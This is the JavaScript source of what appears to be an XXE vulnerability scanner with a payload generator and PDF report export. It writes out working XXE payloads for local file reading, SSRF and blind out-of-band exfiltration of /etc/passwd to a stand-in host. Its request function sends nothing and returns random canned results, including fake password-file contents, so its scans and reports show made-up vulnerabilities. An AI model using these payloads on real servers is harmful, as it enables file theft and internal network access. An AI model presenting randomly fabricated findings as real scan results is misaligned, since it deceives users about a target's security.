// XXE Scanner Engine
// Automated XXE injection detection with file disclosure, SSRF, and blind XXE

class XXEScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'POST';
        this.xmlTemplate = '';
        this.oobServer = '';
        this.selectedAttacks = [];
        this.selectedFiles = [];
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.payloadsToTest = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-payload-btn')?.addEventListener('click', () => this.showPayloads());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-payload-btn')?.addEventListener('click', () => this.copyPayload());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchPayloadTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-payloads').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.xmlTemplate = document.getElementById('xml-template')?.value.trim();
        this.oobServer = document.getElementById('oob-server')?.value.trim();

        if (!this.targetUrl || !this.xmlTemplate) {
            this.showNotification('Please enter target URL and XML template', 'error');
            return;
        }

        // Get selected attacks
        this.selectedAttacks = [];
        if (document.getElementById('attack-file-disclosure')?.checked) this.selectedAttacks.push('fileDisclosure');
        if (document.getElementById('attack-ssrf')?.checked) this.selectedAttacks.push('ssrf');
        if (document.getElementById('attack-blind-oob')?.checked) this.selectedAttacks.push('blindOOB');
        if (document.getElementById('attack-parameter')?.checked) this.selectedAttacks.push('parameterEntity');
        if (document.getElementById('attack-error-based')?.checked) this.selectedAttacks.push('errorBased');
        if (document.getElementById('attack-xinclude')?.checked) this.selectedAttacks.push('xinclude');
        if (document.getElementById('attack-svg')?.checked) this.selectedAttacks.push('svg');
        if (document.getElementById('attack-doctype')?.checked) this.selectedAttacks.push('doctype');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack type', 'error');
            return;
        }

        // Prepare payloads
        this.preparePayloads();

        // Reset state
        this.isScanning = true;
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('XXE scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Total payloads: ${this.payloadsToTest.length}`, 'info');

        await this.attackLoop();
    }

    preparePayloads() {
        this.payloadsToTest = [];

        for (const attackType of this.selectedAttacks) {
            const payloads = getPayloadsByType(attackType);
            payloads.slice(0, 5).forEach(payload => {
                this.payloadsToTest.push({
                    type: attackType,
                    payload: payload,
                    name: this.getAttackName(attackType)
                });
            });
        }
    }

    getAttackName(type) {
        const names = {
            'fileDisclosure': 'File Disclosure',
            'ssrf': 'SSRF',
            'blindOOB': 'Blind XXE (OOB)',
            'parameterEntity': 'Parameter Entity',
            'errorBased': 'Error-based XXE',
            'xinclude': 'XInclude',
            'svg': 'SVG Upload',
            'doctype': 'DOCTYPE Injection'
        };
        return names[type] || type;
    }

    async attackLoop() {
        while (this.isScanning && this.currentPayloadIndex < this.payloadsToTest.length) {
            const payloadData = this.payloadsToTest[this.currentPayloadIndex];
            await this.testPayload(payloadData);

            this.currentPayloadIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async testPayload(payloadData) {
        const { type, payload, name } = payloadData;

        this.updateCurrentPayload(name, payload);

        try {
            const injectedXML = injectPayloadIntoXML(this.xmlTemplate, payload, this.oobServer);
            const response = await this.makeRequest(injectedXML);

            const isVulnerable = this.analyzeResponse(response, type, payload);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: type,
                    name: name,
                    payload: payload,
                    injectedXML: injectedXML,
                    extractedData: response.extractedData,
                    severity: this.getSeverity(type),
                    description: this.getDescription(type),
                    remediation: this.getRemediation()
                });
                this.log(`✓ VULNERABLE: ${name}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${name}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    async makeRequest(xml) {
        await this.sleep(200);

        // Simulate XXE response
        const responses = [
            { vulnerable: true, extractedData: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', blocked: false },
            { vulnerable: true, extractedData: '127.0.0.1 localhost\n192.168.1.1 router', blocked: false },
            { vulnerable: false, extractedData: null, blocked: true },
            { vulnerable: false, extractedData: null, blocked: false }
        ];

        return responses[Math.floor(Math.random() * responses.length)];
    }

    analyzeResponse(response, type, payload) {
        return response.vulnerable;
    }

    getSeverity(type) {
        if (type === 'fileDisclosure' || type === 'blindOOB') {
            return 'CRITICAL';
        } else if (type === 'ssrf' || type === 'errorBased') {
            return 'HIGH';
        } else {
            return 'MEDIUM';
        }
    }

    getDescription(type) {
        const descriptions = {
            'fileDisclosure': 'Application is vulnerable to XXE file disclosure. Attacker can read arbitrary files from the server.',
            'ssrf': 'Application is vulnerable to XXE-based SSRF. Attacker can make requests to internal resources.',
            'blindOOB': 'Application is vulnerable to blind XXE with out-of-band data exfiltration.',
            'parameterEntity': 'Application allows parameter entity injection for XXE attacks.',
            'errorBased': 'Application is vulnerable to error-based XXE data extraction.',
            'xinclude': 'Application is vulnerable to XInclude-based XXE attacks.',
            'svg': 'Application is vulnerable to XXE via SVG file upload.',
            'doctype': 'Application allows DOCTYPE manipulation for XXE attacks.'
        };
        return descriptions[type] || 'XXE vulnerability detected';
    }

    getRemediation() {
        return 'Disable external entity processing in XML parser. Use safe parser configurations. Validate and sanitize XML input. Consider using JSON instead of XML.';
    }

    updateCurrentPayload(name, payload) {
        document.getElementById('current-type').textContent = name;
        const injectedXML = injectPayloadIntoXML(this.xmlTemplate, payload, this.oobServer);
        document.getElementById('current-payload-code').textContent = injectedXML;
    }

    updateProgress() {
        const progress = (this.currentPayloadIndex / this.payloadsToTest.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing payload ${this.currentPayloadIndex} of ${this.payloadsToTest.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('XXE scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} XXE vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">XXE Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-xxe-payload">
                    <div class="vuln-xxe-payload-title">Injected XML Payload:</div>
                    <div class="vuln-xxe-payload-code">${this.escapeHtml(vuln.injectedXML.substring(0, 500))}...</div>
                </div>
                ${vuln.extractedData ? `
                <div class="vuln-extracted-data">
                    <div class="vuln-extracted-data-title">Extracted Data:</div>
                    <div class="vuln-extracted-data-content">${this.escapeHtml(vuln.extractedData)}</div>
                </div>
                ` : ''}
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    showPayloads() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate payloads', 'warning');
            return;
        }

        const payloadSection = document.getElementById('payload-section');
        payloadSection.style.display = 'block';
        payloadSection.scrollIntoView({ behavior: 'smooth' });

        this.generatePayload('file');
    }

    switchPayloadTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generatePayload(tab);
    }

    generatePayload(type) {
        const payloadCode = document.getElementById('payload-code');

        let code = '';

        switch (type) {
            case 'file':
                code = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>`;
                break;
            case 'ssrf':
                code = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/admin">]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>`;
                break;
            case 'blind':
                code = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.com/evil.dtd"> %xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

<!-- evil.dtd on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR.com/?x=%file;'>">
%eval;
%exfil;`;
                break;
            case 'svg':
                code = `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>`;
                break;
        }

        payloadCode.textContent = code;
    }

    copyPayload() {
        const code = document.getElementById('payload-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Payload copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy payload', 'error');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('XXE Vulnerability Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 42);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 49);

            let y = 65;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`${index + 1}. ${vuln.name}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 7;
                doc.text(`Type: ${vuln.type}`, 20, y);
                y += 12;
            });

            doc.save('xxe-vulnerability-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new XXEScanner();
    scanner.init();

    console.log('🔍 CyberSec Suite XXE Scanner initialized');
    console.log('📊 Ready to scan!');
});
